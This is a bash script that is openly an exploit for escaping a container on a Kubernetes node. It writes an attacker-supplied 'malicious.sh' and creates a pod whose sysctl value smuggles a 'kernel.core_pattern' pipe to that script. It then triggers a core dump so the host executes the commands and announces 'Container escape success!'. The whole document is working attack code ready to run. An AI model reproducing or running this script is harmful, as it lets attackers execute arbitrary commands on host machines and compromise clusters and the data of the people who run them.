#!/bin/bash

function get_mounted_path {
echo $(mount |grep -o 'upperdir.*,'|tr -d ',' |grep -o '/.*');

}

function malicious_commands {
for cmd in $@
do
	echo "$cmd >> $(get_mounted_path)/out" >> malicious.sh
done
}

function exploit {
touch out 
echo '#!/bin/bash' > malicious.sh
malicious_commands $@;
}

function create_sysctl_set_pod {
path=$(get_mounted_path);
echo -e "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sysctl-set\nspec:\n  securityContext:\n   sysctls:\n   - name: kernel.shm_rmid_forced\n     value: \"1+kernel.core_pattern=|$path/malicious.sh #\"\n  containers:\n  - name: ubuntu\n    image: ubuntu:latest\n    command: [\"tail\",\"-f\",\"/dev/null\"]" >> sysctl-pod.yaml;

}

echo '[+]Installing requirements'
apt-get update > /dev/null 2>&1
apt-get install wget  > /dev/null 2>&1
wget https://dl.k8s.io/v1.24.1/bin/linux/386/kubectl  > /dev/null 2>&1
chmod +x kubectl 
mv kubectl /usr/bin/
echo '[+]checking for pod creation privilege'
if [ "$(kubectl auth can-i create pod |grep yes)" == 'yes' ];then
  echo "=>granted !";
  echo "[+]Starting exploitation";
  exploit $@;
  chmod +x malicious.sh
  ulimit -c unlimited;
  create_sysctl_set_pod;
  kubectl create -f sysctl-pod.yaml;
  echo '[+]Triggering a coredump';
  tail -f /dev/null &
  kill -SIGSEGV %1;
  echo '[+]Container escape success!';
  cat out;
fi;


